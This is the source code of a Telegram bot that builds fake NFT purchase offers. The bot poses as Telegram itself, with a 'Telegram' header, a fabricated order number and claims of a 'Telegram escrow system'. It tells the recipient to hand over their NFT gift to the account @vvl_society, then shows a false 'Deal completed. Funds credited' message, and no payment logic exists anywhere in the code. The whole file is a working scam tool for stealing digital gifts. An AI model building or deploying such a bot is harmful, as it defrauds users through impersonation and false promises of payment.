import asyncio
import logging
import os
import re
import uuid
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardButton,
    CallbackQuery,
    InlineQueryResultArticle,
    InputTextMessageContent,
    InlineQuery,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}
BOT_USERNAME = "work_vllw_bot"


# ================= ТЕКСТЫ =================
TEXTS = {
    "ru": {
        "usage": (
            "⚠️ Использование: `.buy <ссылка_на_NFT> <сумма> <валюта> [eu]`\n"
            "Пример: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
        ),
        "invalid_link": "⚠️ Неверная ссылка на NFT.",
        "header": "Telegram",
        "offer": "Пользователь предлагает вам",
        "for_gift": "за подарок",
        "valid_for": "Оффер действителен ещё 6 ч. 0 мин.",
        "decline_btn": "❌ Отклонить",
        "accept_btn": "✅ Принять",
        "declined": "❌ Предложение отклонено",
        "not_yours": "⚠️ Эта сделка не для вас.",
        "alert_title": (
            "Внимание!\n\n"
            "Следуйте инструкции, чтобы не потерять подарок и получить оплату.\n\n"
            "Нажмите «ОК», если вы прочитали это сообщение."
        ),
        "deal_lost": "⚠️ Ошибка: данные о сделке утеряны.",
        "deal_title": "NFT Deal",
        "order": "Ордер",
        "buyer_reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу-систему Telegram.",
        "escrow_text": (
            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
        ),
        "instructions": "Инструкция для завершения сделки:",
        "step1": "1. Передайте подарок пользователю: @vvl_society",
        "step2_prefix": "2. Нажмите «Передать NFT» и выберите",
        "step3": "3. Подтвердите передачу подарка.",
        "link_to_gift": "Ссылка на подарок",
        "final_note": (
            "Telegram зафиксирует транзакцию и моментально зачислит "
            "{amount} {currency} на ваш баланс. Резерв действует 24 часа."
        ),
        "transfer_btn": "Передать NFT",
        "confirm_btn": "Подтвердить передачу",
        "confirmed": "✅ Транзакция подтверждена!",
        "deal_done": "✅ Сделка завершена. Средства зачислены на ваш баланс.",
        "inline_title": "NFT предложение",
        "inline_desc": "Нажмите чтобы отправить карточку",
        "send_btn": "📤 Отправить в чат",
        "copy_btn": "📋 Показать inline-запрос",
        "copy_hint": (
            "Скопируйте и вставьте в нужный чат:\n\n"
            "<code>@{bot} {query}</code>\n\n"
            "Затем тапните по появившейся карточке."
        ),
    },
    "en": {
        "usage": (
            "⚠️ Usage: `.buy <NFT_link> <amount> <currency> [eu]`\n"
            "Example: `.buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
        ),
        "invalid_link": "⚠️ Invalid NFT link.",
        "header": "Telegram",
        "offer": "A user offers you",
        "for_gift": "for the gift",
        "valid_for": "Offer is valid for another 6 h. 0 min.",
        "decline_btn": "❌ Decline",
        "accept_btn": "✅ Accept",
        "declined": "❌ Offer declined",
        "not_yours": "⚠️ This deal is not for you.",
        "alert_title": "Attention!\n\nFollow the instructions to receive payment.",
        "deal_lost": "⚠️ Error: deal data lost.",
        "deal_title": "NFT Deal",
        "order": "Order",
        "buyer_reserved": "The buyer has reserved",
        "via_escrow": "via the Telegram escrow system.",
        "escrow_text": "Funds are held in escrow.",
        "instructions": "Instructions:",
        "step1": "1. Transfer gift to: @vvl_society",
        "step2_prefix": "2. Click «Transfer NFT» and choose",
        "step3": "3. Confirm transfer.",
        "link_to_gift": "Gift link",
        "final_note": "Telegram will credit {amount} {currency}. Reservation valid 24h.",
        "transfer_btn": "Transfer NFT",
        "confirm_btn": "Confirm transfer",
        "confirmed": "✅ Transaction confirmed!",
        "deal_done": "✅ Deal completed.",
        "inline_title": "NFT offer",
        "inline_desc": "Tap to send the card",
        "send_btn": "📤 Send to chat",
        "copy_btn": "📋 Show inline query",
        "copy_hint": (
            "Copy and paste into the chat:\n\n"
            "<code>@{bot} {query}</code>\n\n"
            "Then tap the card."
        ),
    },
}


# ================= ПАРСИНГ =================
def parse_nft_link(url):
    url = (url or "").strip()
    for ch in ("\u00a0", "\u200b", "\u200f", "\u200e"):
        url = url.replace(ch, "")
    match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
    if not match:
        logging.warning(f"Не удалось распарсить ссылку: {url!r}")
        return None
    name = match.group(1)
    number = match.group(2)
    return {"name": name, "number": number, "full": f"{name} #{number}", "url": url}


def parse_buy_args(text):
    args = text.split()
    lang = "ru"
    if len(args) >= 2 and args[-1].lower() == "eu":
        lang = "en"
        args = args[:-1]
    if args:
        first = args[0].lower().lstrip("/.")
        if first == "buy":
            args = args[1:]
    if len(args) < 3:
        return None
    return lang, args[0], args[1], args[2].upper()


# ================= СБОРКА ТЕКСТОВ =================
def build_offer_text(t, nft_title, amount, currency, nft_link):
    return (
        f"<b>{t['header']}</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"{t['offer']}\n"
        f"<b>{amount} {currency}</b> {t['for_gift']} {nft_link}.\n\n"
        f"{t['valid_for']}"
    )


def build_offer_keyboard(t, chat_id, user_id, lang):
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text=t["decline_btn"],
            callback_data=f"d_{chat_id}_{user_id}_{lang}",
        ),
        InlineKeyboardButton(
            text=t["accept_btn"],
            callback_data=f"a_{chat_id}_{user_id}_{lang}",
        ),
    )
    return builder


def build_final_text(t, deal):
    return (
        f"<b>{t['deal_title']}</b>\n\n"
        f"{t['order']} #TG-D721BSTP\n\n"
        f"{t['buyer_reserved']} <b>{deal['amount']} {deal['currency']}</b> "
        f"{t['via_escrow']}\n"
        f"{t['escrow_text']}\n\n"
        f"<b>{t['instructions']}</b>\n"
        f"{t['step1']}\n"
        f"{t['step2_prefix']} <b>{deal['title']}</b>\n"
        f"{t['step3']}\n\n"
        f"{t['link_to_gift']}: {deal['link']}\n\n"
        f"{t['final_note'].format(amount=deal['amount'], currency=deal['currency'])}"
    )


def build_final_keyboard(t, deal, chat_id, user_id, lang):
    builder = InlineKeyboardBuilder()
    builder.row(InlineKeyboardButton(text=t["transfer_btn"], url=deal["link"]))
    builder.row(
        InlineKeyboardButton(
            text=t["confirm_btn"],
            callback_data=f"c_{chat_id}_{user_id}_{lang}",
        )
    )
    return builder


# ================= КОМАНДА .buy / /buy =================
@dp.message(Command("buy"))
@dp.message(F.text.startswith(".buy"))
async def cmd_buy_handler(message: types.Message):
    logging.info(f"[CMD] text={message.text!r}")

    parsed = parse_buy_args(message.text)
    if not parsed:
        await message.answer(TEXTS["ru"]["usage"])
        try:
            await message.delete()
        except Exception:
            pass
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        await message.answer(t["invalid_link"])
        try:
            await message.delete()
        except Exception:
            pass
        return

    nft_title = nft_data["full"]

    # Короткий ID для callback_data кнопки
    copy_id = uuid.uuid4().hex[:12]
    active_deals[f"copy_{copy_id}"] = {
        "user_id": message.from_user.id,
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "lang": lang,
    }

    # Просто карточка с двумя кнопками — без лишнего текста
    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(
            text=t["send_btn"],
            url=f"https://t.me/share/url?url={nft_link}&text={amount}%20{currency}",
        )
    )
    builder.row(
        InlineKeyboardButton(
            text=t["copy_btn"],
            callback_data=f"cp_{copy_id}",
        )
    )

    try:
        await message.answer(
            text=build_offer_text(t, nft_title, amount, currency, nft_link),
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=False,
        )
    except Exception as e:
        logging.error(f"Ошибка отправки ответа: {e}")
        await message.answer(f"⚠️ Ошибка: {e}")
        return

    try:
        await message.delete()
    except Exception as e:
        logging.warning(f"Не удалось удалить сообщение: {e}")


# ================= Показать inline-запрос =================
@dp.callback_query(F.data.startswith("cp_"))
async def process_copy(callback: CallbackQuery):
    copy_id = callback.data[len("cp_"):]
    data = active_deals.get(f"copy_{copy_id}")

    if not data:
        await callback.answer("Ссылка устарела, повторите команду", show_alert=True)
        return

    if str(callback.from_user.id) != str(data["user_id"]):
        await callback.answer("Не для вас", show_alert=True)
        return

    query = f"{data['link']} {data['amount']} {data['currency']}"
    if data["lang"] == "en":
        query += " eu"

    t = TEXTS[data["lang"]]
    username = BOT_USERNAME or "work_vllw_bot"
    text = t["copy_hint"].format(bot=username, query=query)

    await callback.message.answer(text=text, parse_mode="HTML")
    await callback.answer("Готово")


# ================= INLINE MODE =================
@dp.inline_query()
async def inline_query_handler(query: InlineQuery):
    text = (query.query or "").strip()

    if not text:
        t = TEXTS["ru"]
        result = InlineQueryResultArticle(
            id="usage",
            title="Использование",
            description="Ссылка + сумма + валюта",
            input_message_content=InputTextMessageContent(message_text=t["usage"]),
        )
        await query.answer(results=[result], cache_time=1)
        return

    parsed = parse_buy_args(text)
    if not parsed:
        t = TEXTS["ru"]
        result = InlineQueryResultArticle(
            id="usage",
            title="⚠️ Неверный формат",
            description="Пример: https://t.me/nft/SnoopDogg-9203 1000 STARS",
            input_message_content=InputTextMessageContent(message_text=t["usage"]),
        )
        await query.answer(results=[result], cache_time=1)
        return

    lang, nft_link, amount, currency = parsed
    t = TEXTS[lang]

    nft_data = parse_nft_link(nft_link)
    if not nft_data:
        result = InlineQueryResultArticle(
            id="bad_link",
            title="⚠️ Неверная ссылка",
            description="Пример: https://t.me/nft/SnoopDogg-9203",
            input_message_content=InputTextMessageContent(message_text=t["invalid_link"]),
        )
        await query.answer(results=[result], cache_time=1)
        return

    nft_title = nft_data["full"]
    chat_id = query.from_user.id
    user_id = query.from_user.id

    deal_id = f"{chat_id}_{user_id}"
    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title,
        "lang": lang,
        "user_id": user_id,
        "chat_id": chat_id,
    }

    text_msg = build_offer_text(t, nft_title, amount, currency, nft_link)
    builder = build_offer_keyboard(t, chat_id, user_id, lang)

    result = InlineQueryResultArticle(
        id=f"offer_{uuid.uuid4().hex[:8]}",
        title=f"{t['inline_title']}: {nft_title}",
        description=f"{amount} {currency} — {t['inline_desc']}",
        input_message_content=InputTextMessageContent(
            message_text=text_msg,
            parse_mode="HTML",
        ),
        reply_markup=builder.as_markup(),
    )

    await query.answer(results=[result], cache_time=1)


# ================= КНОПКИ СДЕЛКИ =================
@dp.callback_query(F.data.startswith("d_"))
async def process_decline(callback: CallbackQuery):
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]
    deal_user_id = parts[-2]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    try:
        await callback.message.edit_text(t["declined"])
    except Exception:
        pass
    await callback.answer()


@dp.callback_query(F.data.startswith("a_"))
async def process_accept(callback: CallbackQuery):
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]
    deal_user_id = parts[-2]
    deal_chat_id = parts[-3]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.answer(text=t["alert_title"], show_alert=True)
    await asyncio.sleep(1.5)

    deal_id = f"{deal_chat_id}_{deal_user_id}"
    deal = active_deals.get(deal_id)
    if not deal:
        try:
            await callback.message.edit_text(t["deal_lost"])
        except Exception:
            pass
        return

    text = build_final_text(t, deal)
    builder = build_final_keyboard(t, deal, deal_chat_id, deal_user_id, lang)

    try:
        await callback.message.edit_text(
            text=text,
            reply_markup=builder.as_markup(),
            parse_mode="HTML",
            disable_web_page_preview=False,
        )
    except Exception as e:
        logging.error(f"Ошибка edit: {e}")


@dp.callback_query(F.data.startswith("c_"))
async def process_confirm(callback: CallbackQuery):
    parts = callback.data.split("_")
    lang = parts[-1] if parts[-1] in TEXTS else "ru"
    t = TEXTS[lang]
    deal_user_id = parts[-2]

    if str(callback.from_user.id) != deal_user_id:
        await callback.answer(t["not_yours"], show_alert=True)
        return

    await callback.answer(t["confirmed"], show_alert=True)
    try:
        await callback.message.edit_text(t["deal_done"])
    except Exception:
        pass


# ================= ВЕБ-СЕРВЕР =================
async def handle(request):
    return web.Response(text="Bot is alive!")


async def main():
    global BOT_USERNAME
    logging.info("=== MAIN STARTED ===")
    port = int(os.environ.get("PORT", 10000))

    me = await bot.get_me()
    BOT_USERNAME = me.username
    logging.info(f"Bot username: {BOT_USERNAME}")

    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logging.info("=== WEB SERVER STARTED ===")

    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
